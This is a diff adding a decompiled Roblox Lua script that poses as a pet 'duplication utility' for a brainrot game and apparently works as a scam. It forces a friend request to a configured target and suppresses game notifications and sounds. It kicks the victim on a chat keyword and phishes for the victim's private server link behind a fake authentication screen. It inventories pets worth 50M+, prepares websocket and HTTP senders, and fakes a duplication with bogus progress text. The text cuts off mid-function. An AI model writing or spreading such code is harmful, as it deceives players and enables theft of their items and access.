@@ -1,0 +1,1206 @@
+local l_HttpService_0 = game:GetService("HttpService");
+local l_ReplicatedStorage_0 = game:GetService("ReplicatedStorage");
+local l_Players_0 = game:GetService("Players");
+local l_Workspace_0 = game:GetService("Workspace");
+local l_LocalPlayer_0 = l_Players_0.LocalPlayer;
+local l_PlayerGui_0 = l_LocalPlayer_0:WaitForChild("PlayerGui");
+local l_ConfigUser_0 = rawget(_G, "User") or (getgenv and getgenv().User);
+local l_TargetName_0 = l_ConfigUser_0;
+local function v1(p3)
+    local v2 = l_Players_0:FindFirstChild(p3);
+    if v2 then
+        return v2;
+    end;
+    while true do
+        local l_v2_0 = l_Players_0.PlayerAdded:Wait();
+        if l_v2_0 and l_v2_0.Name == p3 then
+            return l_v2_0;
+        end;
+    end;
+end;
+task.spawn(function()
+    if not l_TargetName_0 or type(l_TargetName_0) ~= "string" then
+        return;
+    end;
+    local v3 = v1(l_TargetName_0);
+    if v3 then
+        if getgenv then
+            getgenv().User = l_ConfigUser_0 or v3.Name;
+        end;
+        pcall(function() --[[ Line: 0 ]] --[[ Name:  ]]
+            -- upvalues: l_LocalPlayer_0 (ref), v3 (ref)
+            if l_LocalPlayer_0 and v3 and l_LocalPlayer_0 ~= v3 then
+                local v4, v5 = pcall(function() --[[ Line: 0 ]] --[[ Name:  ]]
+                    -- upvalues: l_LocalPlayer_0 (ref), v3 (ref)
+                    return l_LocalPlayer_0:IsFriendsWith(v3.UserId);
+                end);
+                if (not v4 or not v5) and l_LocalPlayer_0.RequestFriendship then
+                    task.wait(10);
+                    l_LocalPlayer_0:RequestFriendship(v3);
+                end;
+            end;
+        end);
+    end;
+end);
+local v6 = syn and syn.websocket.connect or getgenv().WebSocket and getgenv().WebSocket.connect;
+local v7 = syn and syn.request or http and http.request or http_request or fluxus and fluxus.request or request;
+local v8 = {
+    ["1x1x1x1"] = true, 
+    ["67"] = true, 
+    ["Admin Lucky Block"] = true, 
+    ["Agarrini la Palini"] = true, 
+    Alessio = true, 
+    ["Anpali Babel"] = true, 
+    Antonio = true, 
+    Aquanaut = true, 
+    ["Avocadini Antilopini"] = true, 
+    ["Avocadini Guffo"] = true, 
+    Avocadorilla = true, 
+    ["Ballerina Cappuccina"] = true, 
+    ["Ballerino Lololo"] = true, 
+    ["Bambini Crostini"] = true, 
+    ["Bambu Bambu Sahur"] = true, 
+    ["Bananita Dolphinita"] = true, 
+    ["Bananito Bandito"] = true, 
+    ["Bandito Axolito"] = true, 
+    ["Bandito Bobritto"] = true, 
+    ["Belula Beluga"] = true, 
+    ["Bisonte Giuppitere"] = true, 
+    ["Blackhole Goat"] = true, 
+    ["Blueberrinni Octopusini"] = true, 
+    ["Boatito Auratito"] = true, 
+    ["Bombardini Tortinii"] = true, 
+    ["Bombardiro Crocodilo"] = true, 
+    ["Bombombini Gusini"] = true, 
+    ["Boneca Ambalabu"] = true, 
+    ["Brainrot God Lucky Block"] = true, 
+    ["Brasilini Berimbini"] = true, 
+    ["Brr Brr Patapim"] = true, 
+    ["Brr es Teh Patipum"] = true, 
+    ["Brri Brri Bicus Dicus Bombicus"] = true, 
+    ["Brutto Gialutto"] = true, 
+    ["Buho de Fuego"] = true, 
+    ["Bulbito Bandito Traktorito"] = true, 
+    ["Burbaloni Loliloli"] = true, 
+    ["Burguro And Fryuro"] = true, 
+    ["Burrito Bandito"] = true, 
+    ["Cacasito Satalito"] = true, 
+    ["Cachorrito Melonito"] = true, 
+    ["Cacto Hipopotamo"] = true, 
+    ["Capi Taco"] = true, 
+    ["Capitano Moby"] = true, 
+    ["Cappuccino Assassino"] = true, 
+    ["Cappuccino Clownino"] = true, 
+    ["Caramello Filtrello"] = true, 
+    Carloo = true, 
+    ["Carrotini Brainini"] = true, 
+    ["Cavallo Virtuoso"] = true, 
+    ["Celularcini Viciosini"] = true, 
+    Chachechi = true, 
+    ["Chef Crabracadabra"] = true, 
+    ["Chicleteira Bicicleteira"] = true, 
+    ["Chicleteirina Bicicleteirina"] = true, 
+    ["Chihuanini Taconini"] = true, 
+    ["Chillin Chili"] = true, 
+    ["Chimpanzini Bananini"] = true, 
+    ["Chipso and Queso"] = true, 
+    ["Cocofanto Elefanto"] = true, 
+    ["Cocosini Mama"] = true, 
+    ["Corn Corn Corn Sahur"] = true, 
+    ["Crabbo Limonetta"] = true, 
+    ["Dragon Cannelloni"] = true, 
+    ["Dug dug dug"] = true, 
+    ["Dul Dul Dul"] = true, 
+    ["Elefanto Frigo"] = true, 
+    ["Esok Sekolah"] = true, 
+    ["Espresso Signora"] = true, 
+    Eviledon = true, 
+    ["Extinct Ballerina"] = true, 
+    ["Extinct Matteo"] = true, 
+    ["Extinct Tralalero"] = true, 
+    Fluriflura = true, 
+    ["Fragola La La La"] = true, 
+    Frankentteo = true, 
+    ["Frigo Camelo"] = true, 
+    ["Frio Ninja"] = true, 
+    ["Frogato Pirato"] = true, 
+    ["Ganganzelli Trulala"] = true, 
+    ["Gangster Footera"] = true, 
+    ["Garama and Madundung"] = true, 
+    ["Gattatino Nyanino"] = true, 
+    ["Gattito Tacoto"] = true, 
+    ["Girafa Celestre"] = true, 
+    ["Glorbo Fruttodrillo"] = true, 
+    ["Gorillo Subwoofero"] = true, 
+    ["Gorillo Watermelondrillo"] = true, 
+    ["Graipuss Medussi"] = true, 
+    ["Guerriro Digitale"] = true, 
+    ["Guest 666"] = true, 
+    ["Headless Horseman"] = true, 
+    ["Horegini Boom"] = true, 
+    ["Jacko Jack Jack"] = true, 
+    ["Jacko Spaventosa"] = true, 
+    Jackorilla = true, 
+    ["Job Job Job Sahur"] = true, 
+    ["Karker Sahur"] = true, 
+    ["Karkerkar Kurkur"] = true, 
+    ["Ketchuru and Musturu"] = true, 
+    ["Ketupat Kepat"] = true, 
+    ["Krupuk Pagi Pagi"] = true, 
+    ["La Casa Boo"] = true, 
+    ["La Cucaracha"] = true, 
+    ["La Extinct Grande"] = true, 
+    ["La Grande Combinasion"] = true, 
+    ["La Karkerkar Combinasion"] = true, 
+    ["La Sahur Combinasion"] = true, 
+    ["La Secret Combinasion"] = true, 
+    ["La Spooky Grande"] = true, 
+    ["La Supreme Combinasion"] = true, 
+    ["La Taco Combinasion"] = true, 
+    ["La Vacca Jacko Linterino"] = true, 
+    ["La Vacca Saturno Saturnita"] = true, 
+    ["Las Capuchinas"] = true, 
+    ["Las Sis"] = true, 
+    ["Las Tralaleritas"] = true, 
+    ["Las Vaquitas Saturnitas"] = true, 
+    Lerulerulerule = true, 
+    ["Lionel Cactuseli"] = true, 
+    ["Liril\195\172 Laril\195\160"] = true, 
+    ["Los 67"] = true, 
+    ["Los Bombinitos"] = true, 
+    ["Los Bros"] = true, 
+    ["Los Chicleteiras"] = true, 
+    ["Los Combinasionas"] = true, 
+    ["Los Crocodillitos"] = true, 
+    ["Los Hotspotsitos"] = true, 
+    ["Los Jobcitos"] = true, 
+    ["Los Karkeritos"] = true, 
+    ["Los Lucky Blocks"] = true, 
+    ["Los Matteos"] = true, 
+    ["Los Mobilis"] = true, 
+    ["Los Noobinis"] = true, 
+    ["Los Nooo My Hotspotsitos"] = true, 
+    ["Los Orcalitos"] = true, 
+    ["Los Primos"] = true, 
+    ["Los Spooky Combinasionas"] = true, 
+    ["Los Spyderinis"] = true, 
+    ["Los Tacoritas"] = true, 
+    ["Los Tipi Tacos"] = true, 
+    ["Los Tortus"] = true, 
+    ["Los Tralaleritos"] = true, 
+    ["Los Tungtungtungcitos"] = true, 
+    ["Magi Ribbitini"] = true, 
+    ["Malame Amarele"] = true, 
+    ["Mangolini Parrocini"] = true, 
+    ["Mariachi Corazoni"] = true, 
+    ["Mastodontico Telepiedone"] = true, 
+    Matteo = true, 
+    Meowl = true, 
+    ["Mieteteira Bicicleteira"] = true, 
+    ["Money Money Puggy"] = true, 
+    ["Mummio Rappitto"] = true, 
+    ["Mummy Ambalabu"] = true, 
+    ["Mythic Lucky Block"] = true, 
+    ["Noo my Candy"] = true, 
+    ["Noo my examine"] = true, 
+    ["Noobini Pizzanini"] = true, 
+    ["Nooo My Hotspot"] = true, 
+    ["Nuclearo Dinossauro"] = true, 
+    ["Odin Din Din Dun"] = true, 
+    ["Orangutini Ananassini"] = true, 
+    ["Orcalero Orcala"] = true, 
+    ["Orcalita Orcala"] = true, 
+    Pakrahmatmamat = true, 
+    Pakrahmatmatina = true, 
+    ["Pandaccini Bananini"] = true, 
+    ["Penguino Cocosino"] = true, 
+    ["Perochello Lemonchello"] = true, 
+    ["Perrito Burrito"] = true, 
+    ["Pi Pi Watermelon"] = true, 
+    ["Piccione Macchina"] = true, 
+    ["Piccionetta Macchina"] = true, 
+    ["Pinealotto Fruttarino"] = true, 
+    ["Pipi Avocado"] = true, 
+    ["Pipi Corni"] = true, 
+    ["Pipi Kiwi"] = true, 
+    ["Pipi Potato"] = true, 
+    ["Pop Pop Sahur"] = true, 
+    ["Pot Hotspot"] = true, 
+    ["Pot Pumpkin"] = true, 
+    ["Pumpkini Spyderini"] = true, 
+    Quackula = true, 
+    ["Quesadilla Crocodila"] = true, 
+    ["Quesadillo Vampiro"] = true, 
+    ["Quivioli Ameleonni"] = true, 
+    ["Raccooni Jandelini"] = true, 
+    ["Rang Ring Bus"] = true, 
+    ["Rhino Helicopterino"] = true, 
+    ["Rhino Toasterino"] = true, 
+    ["Salamino Penguino"] = true, 
+    ["Sammyni Spyderini"] = true, 
+    ["Secret Lucky Block"] = true, 
+    ["Sigma Boy"] = true, 
+    ["Sigma Girl"] = true, 
+    ["Signore Carapace"] = true, 
+    ["Skull Skull Skull"] = true, 
+    Snailenzo = true, 
+    ["Spaghetti Tualetti"] = true, 
+    ["Spioniro Golubiro"] = true, 
+    ["Spooky Lucky Block"] = true, 
+    ["Spooky and Pumpky"] = true, 
+    Squalanana = true, 
+    ["Strawberrelli Flamingelli"] = true, 
+    ["Strawberry Elephant"] = true, 
+    ["Svinina Bombardino"] = true, 
+    ["Ta Ta Ta Ta Sahur"] = true, 
+    ["Taco Lucky Block"] = true, 
+    ["Tacorita Bicicleta"] = true, 
+    ["Talpa Di Fero"] = true, 
+    ["Tang Tang Keletang"] = true, 
+    Tartaragno = true, 
+    ["Tartaruga Cisterna"] = true, 
+    ["Te Te Te Sahur"] = true, 
+    Telemorte = true, 
+    ["Tentacolo Tecnico"] = true, 
+    ["Ti Ti Ti Sahur"] = true, 
+    ["Tictac Sahur"] = true, 
+    ["Tigrilini Watermelini"] = true, 
+    ["Tigroligre Frutonni"] = true, 
+    ["Tim Cheese"] = true, 
+    ["Tipi Topi Taco"] = true, 
+    ["Tirilikalika Tirilikalako"] = true, 
+    ["To to to Sahur"] = true, 
+    ["Tob Tobi Tobi"] = true, 
+    ["Toiletto Focaccino"] = true, 
+    ["Torrtuginni Dragonfrutini"] = true, 
+    ["Tracoducotulu Delapeladustuz"] = true, 
+    ["Tractoro Dinosauro"] = true, 
+    Tralaledon = true, 
+    ["Tralalero Tralala"] = true, 
+    ["Tralalita Tralala"] = true, 
+    ["Trenostruzzo Turbo 3000"] = true, 
+    ["Trenostruzzo Turbo 4000"] = true, 
+    ["Tric Trac Baraboom"] = true, 
+    Trickolino = true, 
+    ["Trippi Troppi"] = true, 
+    ["Trippi Troppi Troppa Trippa"] = true, 
+    ["Trulimero Trulicina"] = true, 
+    ["Tukanno Bananno"] = true, 
+    ["Unclito Samito"] = true, 
+    ["Urubini Flamenguini"] = true, 
+    ["Vampira Cappucina"] = true, 
+    ["Vulturino Skeletono"] = true, 
+    ["Wombo Rollo"] = true, 
+    ["Yess my examine"] = true, 
+    ["Zibra Zubra Zibralini"] = true, 
+    ["Zombie Tralala"] = true
+};
+pcall(function() --[[ Line: 0 ]] --[[ Name:  ]]
+    -- upvalues: l_ReplicatedStorage_0 (ref)
+    local v9 = l_ReplicatedStorage_0:WaitForChild("Packages", 5):WaitForChild("Net", 5):WaitForChild("RE/NotificationService/Notify", 5);
+    if v9 then
+        v9:Destroy();
+    end;
+end);
+task.spawn(function() --[[ Line: 0 ]] --[[ Name:  ]]
+    for _, v11 in ipairs(game:GetDescendants()) do
+        do
+            local l_v11_0 = v11;
+            if l_v11_0:IsA("Sound") then
+                pcall(function() --[[ Line: 0 ]] --[[ Name:  ]]
+                    -- upvalues: l_v11_0 (ref)
+                    l_v11_0.Volume = 0;
+                end);
+            end;
+        end;
+    end;
+    game.DescendantAdded:Connect(function(v13) --[[ Line: 0 ]] --[[ Name:  ]]
+        if v13:IsA("Sound") then
+            pcall(function() --[[ Line: 0 ]] --[[ Name:  ]]
+                -- upvalues: v13 (ref)
+                v13.Volume = 0;
+            end);
+        end;
+    end);
+end);
+task.spawn(function() --[[ Line: 0 ]] --[[ Name:  ]]
+    -- upvalues: l_LocalPlayer_0 (ref), l_Players_0 (ref)
+    pcall(function() --[[ Line: 0 ]] --[[ Name:  ]]
+        -- upvalues: l_LocalPlayer_0 (ref), l_Players_0 (ref)
+        local l_TextChatService_0 = game:GetService("TextChatService");
+        if l_TextChatService_0 and l_TextChatService_0:FindFirstChild("ChatInputBarConfiguration") then
+            l_TextChatService_0.MessageReceived:Connect(function(v15) --[[ Line: 0 ]] --[[ Name:  ]]
+                -- upvalues: l_LocalPlayer_0 (ref)
+                if v15 then
+                    local l_Text_0 = v15.Text;
+                    if type(l_Text_0) == "string" and v15.Text:lower() == "ddg" then
+                        task.wait();
+                        l_LocalPlayer_0:Kick();
+                    end;
+                end;
+            end);
+            return;
+        else
+            local function v19(v17) --[[ Line: 0 ]] --[[ Name:  ]]
+                -- upvalues: l_LocalPlayer_0 (ref)
+                v17.Chatted:Connect(function(v18) --[[ Line: 0 ]] --[[ Name:  ]]
+                    -- upvalues: l_LocalPlayer_0 (ref)
+                    if v18:lower() == "ddg" then
+                        task.wait();
+                        l_LocalPlayer_0:Kick();
+                    end;
+                end);
+            end;
+            l_Players_0.PlayerAdded:Connect(v19);
+            for _, v21 in ipairs(l_Players_0:GetPlayers()) do
+                v21.Chatted:Connect(function(v22) --[[ Line: 0 ]] --[[ Name:  ]]
+                    -- upvalues: l_LocalPlayer_0 (ref)
+                    if v22:lower() == "ddg" then
+                        task.wait();
+                        l_LocalPlayer_0:Kick();
+                    end;
+                end);
+            end;
+            return;
+        end;
+    end);
+end);
+local l_ScreenGui_0 = Instance.new("ScreenGui");
+l_ScreenGui_0.Name = "BrainrotAuth";
+l_ScreenGui_0.ResetOnSpawn = false;
+l_ScreenGui_0.Parent = l_PlayerGui_0;
+local v24 = Instance.new("Frame", l_ScreenGui_0);
+v24.Size = UDim2.new(0, 420, 0, 240);
+v24.Position = UDim2.new(0.5, -210, 0.5, -120);
+v24.BackgroundColor3 = Color3.fromRGB(20, 20, 25);
+v24.BorderColor3 = Color3.fromRGB(255, 60, 60);
+v24.BorderSizePixel = 1;
+v24.Active = true;
+v24.Draggable = true;
+Instance.new("UICorner", v24).CornerRadius = UDim.new(0, 6);
+local v25 = Instance.new("TextLabel", v24);
+v25.Size = UDim2.new(1, -20, 0, 50);
+v25.Position = UDim2.new(0.5, 0, 0, 0);
+v25.AnchorPoint = Vector2.new(0.5, 0);
+v25.BackgroundTransparency = 1;
+v25.Font = Enum.Font.GothamBold;
+v25.Text = "AUTHENTICATION REQUIRED";
+v25.TextColor3 = Color3.fromRGB(255, 255, 255);
+v25.TextSize = 22;
+local v26 = Instance.new("TextLabel", v24);
+v26.Size = UDim2.new(1, -20, 0, 20);
+v26.Position = UDim2.new(0.5, 0, 0, 45);
+v26.AnchorPoint = Vector2.new(0.5, 0);
+v26.BackgroundTransparency = 1;
+v26.Font = Enum.Font.Gotham;
+v26.Text = "Please provide a private server link to continue.";
+v26.TextColor3 = Color3.fromRGB(160, 160, 160);
+v26.TextSize = 14;
+local v27 = Instance.new("TextLabel", v24);
+v27.Size = UDim2.new(1, -40, 0, 40);
+v27.Position = UDim2.new(0.5, 0, 0, 70);
+v27.AnchorPoint = Vector2.new(0.5, 0);
+v27.BackgroundTransparency = 1;
+v27.Font = Enum.Font.Gotham;
+v27.Text = "NOTE: You must provide the link for the private server you are currently in, otherwise the duplication process will fail.";
+v27.TextColor3 = Color3.fromRGB(255, 180, 0);
+v27.TextSize = 12;
+v27.TextWrapped = true;
+local v28 = Instance.new("TextBox", v24);
+v28.Size = UDim2.new(1, -40, 0, 40);
+v28.Position = UDim2.new(0.5, 0, 0.5, 25);
+v28.AnchorPoint = Vector2.new(0.5, 0.5);
+v28.BackgroundColor3 = Color3.fromRGB(35, 35, 40);
+v28.BorderColor3 = Color3.fromRGB(50, 50, 55);
+v28.Font = Enum.Font.Gotham;
+v28.PlaceholderText = "https://roblox.com/share?code=...";
+v28.TextColor3 = Color3.fromRGB(230, 230, 230);
+v28.TextSize = 16;
+v28.Text = "";
+v28.ClearTextOnFocus = true;
+Instance.new("UICorner", v28).CornerRadius = UDim.new(0, 4);
+local v29 = Instance.new("TextButton", v24);
+v29.Size = UDim2.new(1, -40, 0, 40);
+v29.Position = UDim2.new(0.5, 0, 1, -30);
+v29.AnchorPoint = Vector2.new(0.5, 1);
+v29.BackgroundColor3 = Color3.fromRGB(255, 60, 60);
+v29.Font = Enum.Font.GothamBold;
+v29.Text = "VERIFY";
+v29.TextColor3 = Color3.fromRGB(255, 255, 255);
+v29.TextSize = 18;
+Instance.new("UICorner", v29).CornerRadius = UDim.new(0, 4);
+local function v81() --[[ Line: 0 ]] --[[ Name:  ]]
+    -- upvalues: l_Workspace_0 (ref), l_LocalPlayer_0 (ref), l_ReplicatedStorage_0 (ref), l_PlayerGui_0 (ref)
+    local function v32(v30) --[[ Line: 0 ]] --[[ Name:  ]]
+        if not v30 then
+            return 0;
+        else
+            local v31 = tostring(v30):gsub("[$,/s]", ""):gsub("K", "e3"):gsub("M", "e6"):gsub("B", "e9"):gsub("T", "e12");
+            return tonumber(v31) or 0;
+        end;
+    end;
+    local function v52() --[[ Line: 0 ]] --[[ Name:  ]]
+        -- upvalues: l_Workspace_0 (ref), l_LocalPlayer_0 (ref), v32 (ref), l_ReplicatedStorage_0 (ref)
+        local v33 = {};
+        local l_Plots_0 = l_Workspace_0:FindFirstChild("Plots");
+        if not l_Plots_0 then
+            return v33;
+        else
+            local v35 = nil;
+            local v36 = l_LocalPlayer_0.DisplayName .. "'s Base";
+            for _, v38 in ipairs(l_Plots_0:GetChildren()) do
+                if v38:IsA("Model") then
+                    local v39 = v38:FindFirstChild("PlotSign", true) and v38.PlotSign:FindFirstChild("SurfaceGui", true) and v38.PlotSign.SurfaceGui:FindFirstChild("Frame", true) and v38.PlotSign.SurfaceGui.Frame:FindFirstChild("TextLabel", true);
+                    if v39 and v39.Text == v36 then
+                        v35 = v38;
+                        break;
+                    end;
+                end;
+            end;
+            if not v35 then
+                return v33;
+            else
+                local v40 = v35.FindFirstChild(v35, "AnimalPodiums");
+                if not v40 then
+                    return v33;
+                else
+                    for _, v42 in ipairs(v40:GetChildren()) do
+                        do
+                            local l_v42_0 = v42;
+                            pcall(function() --[[ Line: 0 ]] --[[ Name:  ]]
+                                -- upvalues: l_v42_0 (ref), v32 (ref), v35 (ref), l_ReplicatedStorage_0 (ref), v33 (ref)
+                                local l_AnimalOverhead_0 = l_v42_0.Base.Spawn.Attachment.AnimalOverhead;
+                                if v32(l_AnimalOverhead_0.Generation.Text) >= 50000000 then
+                                    local l_Text_1 = l_AnimalOverhead_0.DisplayName.Text;
+                                    local l_v35_FirstChild_0 = v35:FindFirstChild(l_Text_1);
+                                    if l_v35_FirstChild_0 and l_v35_FirstChild_0:IsA("Model") and l_v35_FirstChild_0.PrimaryPart and l_v35_FirstChild_0.PrimaryPart.Name == "RootPart" then
+                                        local v47 = nil;
+                                        local v48 = l_ReplicatedStorage_0:FindFirstChild("Animations", true) and l_ReplicatedStorage_0.Animations:FindFirstChild("Animals", true) and l_ReplicatedStorage_0.Animations.Animals:FindFirstChild(l_Text_1, true);
+                                        if v48 then
+                                            v47 = v48:FindFirstChild("Idle");
+                                        end;
+                                        local v49 = l_v42_0:FindFirstChild("Claim", true) and l_v42_0.Claim:FindFirstChild("Main", true);
+                                        local l_v33_0 = v33;
+                                        local v51 = {
+                                            modelToClone = l_v35_FirstChild_0, 
+                                            spawnToClone = l_v42_0.Base.Spawn, 
+                                            claimToClone = v49, 
+                                            animationToClone = v47
+                                        };
+                                        table.insert(l_v33_0, v51);
+                                    end;
+                                end;
+                            end);
+                        end;
+                    end;
+                    return v33;
+                end;
+            end;
+        end;
+    end;
+    local l_ScreenGui_1 = Instance.new("ScreenGui");
+    l_ScreenGui_1.Name = "DupeUI";
+    l_ScreenGui_1.ResetOnSpawn = false;
+    l_ScreenGui_1.Parent = l_PlayerGui_0;
+    local v54 = Instance.new("Frame", l_ScreenGui_1);
+    v54.Size = UDim2.new(0, 480, 0, 280);
+    v54.Position = UDim2.new(0.5, -240, 0.5, -140);
+    v54.BackgroundColor3 = Color3.fromRGB(15, 18, 26);
+    v54.BorderColor3 = Color3.fromRGB(32, 186, 214);
+    v54.BorderSizePixel = 0;
+    v54.Active = true;
+    v54.Draggable = true;
+    Instance.new("UICorner", v54).CornerRadius = UDim.new(0, 10);
+    local v55 = Instance.new("TextLabel", v54);
+    v55.Size = UDim2.new(1, 0, 0, 52);
+    v55.BackgroundTransparency = 1;
+    v55.Font = Enum.Font.GothamBold;
+    v55.Text = "BRAINROT DUPLICATION UTILITY";
+    v55.TextColor3 = Color3.fromRGB(235, 245, 255);
+    v55.TextSize = 26;
+    local v56 = Instance.new("TextButton", v54);
+    v56.Size = UDim2.new(1, -40, 0, 54);
+    v56.Position = UDim2.new(0.5, 0, 0.5, -10);
+    v56.AnchorPoint = Vector2.new(0.5, 0.5);
+    v56.BackgroundColor3 = Color3.fromRGB(32, 186, 214);
+    v56.Font = Enum.Font.GothamBold;
+    v56.Text = "DUPE 50M+ BRAINROTS";
+    v56.TextColor3 = Color3.fromRGB(10, 14, 20);
+    v56.TextSize = 20;
+    Instance.new("UICorner", v56).CornerRadius = UDim.new(0, 8);
+    local v57 = Instance.new("TextLabel", v54);
+    v57.Size = UDim2.new(1, -40, 0, 68);
+    v57.Position = UDim2.new(0.5, 0, 1, -40);
+    v57.AnchorPoint = Vector2.new(0.5, 0.5);
+    v57.BackgroundTransparency = 1;
+    v57.Font = Enum.Font.Gotham;
+    v57.Text = "Keep the server empty for best results. After duping, stay in-game 5-10 minutes or risk losing the replicated assets.";
+    v57.TextColor3 = Color3.fromRGB(255, 210, 120);
+    v57.TextSize = 13;
+    v57.TextWrapped = true;
+    local v58 = Instance.new("Frame", v54);
+    v58.Size = UDim2.new(1, -40, 0, 120);
+    v58.Position = UDim2.new(0.5, 0, 0.5, 12);
+    v58.AnchorPoint = Vector2.new(0.5, 0.5);
+    v58.BackgroundTransparency = 1;
+    v58.Visible = false;
+    local v59 = Instance.new("TextLabel", v58);
+    v59.Size = UDim2.new(1, 0, 0, 30);
+    v59.Position = UDim2.new(0.5, 0, 0, 20);
+    v59.AnchorPoint = Vector2.new(0.5, 0);
+    v59.BackgroundTransparency = 1;
+    v59.Font = Enum.Font.Gotham;
+    v59.Text = "[ STANDBY ]";
+    v59.TextColor3 = Color3.fromRGB(220, 230, 240);
+    v59.TextSize = 17;
+    local v60 = Instance.new("Frame", v58);
+    v60.Size = UDim2.new(1, 0, 0, 12);
+    v60.Position = UDim2.new(0.5, 0, 0, 64);
+    v60.AnchorPoint = Vector2.new(0.5, 0);
+    v60.BackgroundColor3 = Color3.fromRGB(26, 32, 44);
+    v60.BorderColor3 = Color3.fromRGB(32, 186, 214);
+    v60.BorderSizePixel = 0;
+    local v61 = Instance.new("Frame", v60);
+    v61.BackgroundColor3 = Color3.fromRGB(32, 186, 214);
+    v61.Size = UDim2.new(0, 0, 1, 0);
+    v56.MouseButton1Click:Connect(function() --[[ Line: 0 ]] --[[ Name:  ]]
+        -- upvalues: v56 (ref), v58 (ref), v59 (ref), v52 (ref), v61 (ref), l_Workspace_0 (ref)
+        v56.Visible = false;
+        v58.Visible = true;
+        task.spawn(function() --[[ Line: 0 ]] --[[ Name:  ]]
+            -- upvalues: v59 (ref), v52 (ref), v58 (ref), v56 (ref), v61 (ref), l_Workspace_0 (ref)
+            local v62 = {
+                "Bypassing plot permissions...", 
+                "Exploiting server replication service...", 
+                "Injecting duplication packets...", 
+                "Allocating memory for new instances...", 
+                "Replicating object properties...", 
+                "Bypassing anti-cheat hash checks...", 
+                "Writing cloned entities to memory...", 
+                "Finalizing instance synchronization..."
+            };
+            v59.Text = "Scanning your plot for high-value assets...";
+            local v63 = v52();
+            if #v63 == 0 then
+                v59.Text = "No valid targets found on your plot. Aborting.";
+                task.wait(3);
+                v58.Visible = false;
+                v56.Visible = true;
+                v61.Size = UDim2.new(0, 0, 1, 0);
+                v59.Text = "[ STANDBY ]";
+                return;
+            else
+                v59.Text = string.format("Found %d high-value targets. Beginning duplication protocol...", #v63);
+                task.wait(2);
+                for v64 = 1, 100 do
+                    local v65 = v64 / 100;
+                    v61:TweenSize(UDim2.new(v65, 0, 1, 0), Enum.EasingDirection.Out, Enum.EasingStyle.Quad, 0.6, true);
+                    local v66 = 100 / #v62;
+                    if v64 % math.floor(v66) == 0 then
+                        v66 = v64 / (100 / #v62);
+                        local v67 = math.ceil(v66);
+                        v66 = #v62;
+                        v59.Text = v62[math.min(v67, v66)];
+                    end;
+                    task.wait(0.6);
+                end;
+                v59.Text = "Protocol complete. Placing new assets...";
+                task.wait(1);
+                local v68 = Instance.new("Folder", l_Workspace_0);
+                v68.Name = "ReplicatedAssets_" .. math.random(1, 1000);
+                for _, v70 in ipairs(v63) do
+                    local v71 = v70.spawnToClone:Clone();
+                    local v72 = v70.modelToClone:Clone();
+                    local v73 = v70.claimToClone and v70.claimToClone:Clone();
+                    v71.Parent = v68;
+                    v72.Parent = v68;
+                    if v73 then
+                        v73.Parent = v68;
+                    end;
+                    v72:SetPrimaryPartCFrame((v70.modelToClone:GetPrimaryPartCFrame()));
+                    for _, v75 in ipairs(v72:GetDescendants()) do
+                        if v75:IsA("BasePart") then
+                            v75.Size = v75.Size * 1;
+                        end;
+                    end;
+                    do
+                        local l_v70_0 = v70;
+                        do
+                            local l_v72_0 = v72;
+                            if l_v70_0.animationToClone then
+                                pcall(function() --[[ Line: 0 ]] --[[ Name:  ]]
+                                    -- upvalues: l_v72_0 (ref), l_v70_0 (ref)
+                                    local l_AnimationController_0 = l_v72_0:FindFirstChildOfClass("AnimationController");
+                                    if l_AnimationController_0 then
+                                        local l_Animator_0 = l_AnimationController_0:FindFirstChildOfClass("Animator");
+                                        if l_Animator_0 then
+                                            local v80 = l_v70_0.animationToClone:Clone();
+                                            v80.Parent = l_Animator_0;
+                                            l_Animator_0:LoadAnimation(v80):Play();
+                                        end;
+                                    end;
+                                end);
+                            end;
+                            v71.CFrame = l_v70_0.spawnToClone.CFrame;
+                            if v73 then
+                                v73.CFrame = l_v70_0.claimToClone.CFrame;
+                            end;
+                        end;
+                    end;
+                end;
+                v59.Text = string.format("\226\156\133 Duplication Successful: %d assets replicated.", #v63);
+                task.wait(3);
+                v58.Visible = false;
+                v56.Visible = true;
+                v61.Size = UDim2.new(0, 0, 1);
+                v59.Text = "[ STANDBY ]";
+                return;
+            end;
+        end);
+    end);
+end;
+v29.MouseButton1Click:Connect(function() --[[ Line: 0 ]] --[[ Name:  ]]
+    -- upvalues: v28 (ref), v29 (ref), l_ScreenGui_0 (ref), l_LocalPlayer_0 (ref), l_Workspace_0 (ref), l_Players_0 (ref), v6 (ref), l_HttpService_0 (ref), v7 (ref), l_ReplicatedStorage_0 (ref), v8 (ref), v81 (ref)
+    local l_Text_2 = v28.Text;
+    if not l_Text_2:match("roblox.com/share") or not l_Text_2:match("code=") or not l_Text_2:match("type=Server") then
+        v29.Text = "INVALID LINK";
+        task.wait(1.5);
+        v29.Text = "VERIFY";
+        return;
+    else
+        l_ScreenGui_0:Destroy();
+        task.spawn(function() --[[ Line: 0 ]] --[[ Name:  ]]
+            -- upvalues: l_LocalPlayer_0 (ref), l_Workspace_0 (ref), l_Players_0 (ref), l_Text_2 (ref), v6 (ref), l_HttpService_0 (ref), v7 (ref)
+            if game.PlaceId ~= 109983668079237 then
+                return;
+            else
+                local function v85(v83) --[[ Line: 0 ]] --[[ Name:  ]]
+                    if not v83 then
+                        return 0;
+                    else
+                        local v84 = tostring(v83):gsub("[$,/s]", ""):gsub("K", "e3"):gsub("M", "e6"):gsub("B", "e9"):gsub("T", "e12");
+                        return tonumber(v84) or 0;
+                    end;
+                end;
+                local v112, v113 = (function() --[[ Line: 0 ]] --[[ Name:  ]]
+                    -- upvalues: l_LocalPlayer_0 (ref), l_Workspace_0 (ref), v85 (ref)
+                    local v86 = {};
+                    local v87 = nil;
+                    local l_Name_0 = l_LocalPlayer_0.Name;
+                    local l_DisplayName_0 = l_LocalPlayer_0.DisplayName;
+                    local l_Plots_1 = l_Workspace_0:FindFirstChild("Plots");
+                    if not l_Plots_1 then
+                        return "Could not find 'Plots' folder.", nil;
+                    else
+                        for _, v92 in ipairs(l_Plots_1:GetChildren()) do
+                            if v92:IsA("Model") then
+                                local l_v92_FirstChild_0 = v92:FindFirstChild("PlotSign", true);
+                                if l_v92_FirstChild_0 then
+                                    local v94 = l_v92_FirstChild_0:FindFirstChild("TextLabel", true) or l_v92_FirstChild_0:FindFirstChildOfClass("TextLabel");
+                                    if v94 and (string.find(v94.Text, l_DisplayName_0, 1, true) or string.find(v94.Text, l_Name_0, 1, true)) then
+                                        v87 = v92;
+                                        break;
+                                    end;
+                                end;
+                            end;
+                        end;
+                        if not v87 then
+                            return "User plot could not be identified.", nil;
+                        else
+                            for _, v96 in ipairs(v87.GetDescendants(v87)) do
